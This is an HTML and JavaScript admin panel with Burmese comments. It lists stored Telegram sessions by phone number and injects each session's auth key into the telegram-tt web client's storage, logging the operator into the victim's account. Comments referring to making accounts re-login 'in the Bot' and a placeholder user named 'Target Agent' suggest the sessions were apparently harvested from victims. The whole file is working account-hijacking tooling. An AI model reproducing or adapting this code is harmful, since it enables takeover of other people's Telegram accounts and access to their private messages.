<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Session Manager</title>
    <style>
        body { font-family: Arial, sans-serif; background: #121212; color: #fff; padding: 20px; }
        .container { max-width: 600px; margin: 0 auto; background: #1e1e1e; padding: 20px; border-radius: 8px; }
        input { width: calc(100% - 20px); padding: 10px; margin-bottom: 10px; background: #333; color: #fff; border: 1px solid #555; }
        button { padding: 10px 15px; background: #007bff; color: white; border: none; cursor: pointer; border-radius: 5px; width: 100%; }
        button:hover { background: #0056b3; }
        .session-card { background: #2a2a2a; padding: 15px; margin-top: 15px; border-radius: 5px; border-left: 4px solid #00ffcc; }
        .login-btn { background: #00ffcc; color: #000; font-weight: bold; margin-top: 10px; }
        #dashboard { display: none; }
    </style>
</head>
<body>

<div class="container" id="login-screen">
    <h2>Admin Access</h2>
    <input type="password" id="admin-pass" placeholder="Enter Admin Password">
    <button onclick="loadSessions()">Enter Dashboard</button>
</div>

<div class="container" id="dashboard">
    <h2>Secured Sessions</h2>
    <button onclick="window.location.reload()" style="background: #dc3545; margin-bottom: 15px;">Logout</button>
    <div id="sessions-list">Loading...</div>
</div>

<script>
    let currentPassword = "";

    async function loadSessions() {
        const passInput = document.getElementById('admin-pass').value;
        if (!passInput) return alert("Password required");

        currentPassword = passInput;
        document.getElementById('login-screen').style.display = 'none';
        document.getElementById('dashboard').style.display = 'block';

        try {
            const res = await fetch('/api/admin/sessions', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ password: currentPassword })
            });
            const data = await res.json();

            if (data.success) {
                let html = "";
                data.sessions.forEach(s => {
                    html += `
                    <div class="session-card">
                        <strong>Phone:</strong> ${s.phoneNumber}<br>
                        <small>Date: ${new Date(s.dateAdded).toLocaleString()}</small><br>
                        <button class="login-btn" onclick="loginToTT('${s.phoneNumber}')">🚀 Launch Telegram Web (telegram-tt)</button>
                    </div>`;
                });
                document.getElementById('sessions-list').innerHTML = html || "No sessions found.";
            } else {
                alert("Error: " + data.error);
                window.location.reload();
            }
        } catch (err) {
            alert("Network Error");
            window.location.reload();
        }
    }

    async function loginToTT(phoneNumber) {
        document.getElementById('sessions-list').innerHTML = "<h3 style='color:#00ffcc;'>Injecting Session... Please wait...</h3>";
        
        try {
            const res = await fetch('/api/admin/get-tt-session', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ password: currentPassword, phoneNumber: phoneNumber })
            });
            const data = await res.json();

            if (data.success) {
                // 🌟 [အရေးကြီးပြင်ဆင်ချက်] - Session အဟောင်းများတွင် authKey မပါလျှင် တားဆီးခြင်း
                if (!data.authKeyHex || !data.dcId) {
                    alert("⚠️ ဤ Session သည် Data အဟောင်းဖြစ်နေပါသည်။ (telegram-tt အတွက် authKey မပါဝင်ပါ) ထိုအကောင့်ကို Bot တွင် အသစ်ပြန်လည် Login ဝင်ခိုင်းပါ။");
                    window.location.reload();
                    return; // အောက်က Code များကို ဆက်မလုပ်တော့ဘဲ ရပ်တန့်မည်
                }

                // Hex ကို Byte Array သို့ ပြောင်းခြင်း
                const authKeyArray = new Uint8Array(data.authKeyHex.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
                const userIdStr = String(data.userId);

                // Storage အဟောင်းများ ရှင်းလင်းခြင်း
                localStorage.clear();
                sessionStorage.clear();

                localStorage.setItem('dc', String(data.dcId));
                
                const globalState = {
                    auth: { state: "authorizationStateReady", phoneNumber: phoneNumber },
                    currentUserId: userIdStr,
                    byTabId: {},
                    messages: { byChatId: {} },
                    chats: { byId: {}, listIds: { active: [] } },
                    users: {
                        byId: {
                            [userIdStr]: { 
                                id: userIdStr, 
                                type: "userLocal", 
                                phoneNumber: phoneNumber,
                                firstName: "Target",
                                lastName: "Agent"
                            }
                        }
                    },
                    recentEmojis: [],
                    settings: { byKey: { theme: "dark", language: "en", messageTextSize: 16, animationLevel: 1, messageSendKeycombo: "enter" } }
                };
                localStorage.setItem('tt-global-state', JSON.stringify(globalState));

                const deleteRequest = window.indexedDB.deleteDatabase('tt-data');

deleteRequest.onsuccess = function() {
    // ဖျက်ပြီးမှ အသစ်ပြန်လည် တည်ဆောက်ပါမည်
    const request = window.indexedDB.open('tt-data', 1);
    
    request.onupgradeneeded = function(event) {
        const db = event.target.result;
        if (!db.objectStoreNames.contains('keyval')) {
            db.createObjectStore('keyval');
        }
    };

    request.onsuccess = function(event) {
        const db = event.target.result;
        if (db.objectStoreNames.contains('keyval')) {
            const transaction = db.transaction(['keyval'], 'readwrite');
            const store = transaction.objectStore('keyval');
            
            store.put(authKeyArray, `dc${data.dcId}_auth_key`);
            store.put(String(data.dcId), 'dc');
            
            transaction.oncomplete = () => {
                window.location.href = '/'; 
            };
        } else {
            alert("Storage init failed. Please try again.");
            // 🌟 ပြင်ဆင်ချက်: Failed ဖြစ်လျှင် White screen မဖြစ်စေရန် Data များကို ပြန်ဖျက်ပြီး Redirect မလုပ်ပါနှင့်
            localStorage.clear();
        }
    };

    request.onerror = function() {
        alert("IndexedDB Error. Please clear browser data and try again.");
        localStorage.clear();
    };
};

deleteRequest.onerror = function() {
    alert("Old storage clear failed. Please clear browser site data manually.");
};

            } else {
                alert("Session Load Failed!");
                window.location.reload();
            }
        } catch (err) {
            alert("Error injecting session. Check server connection.");
            window.location.reload();
        }
    }
</script>
</body>
</html>
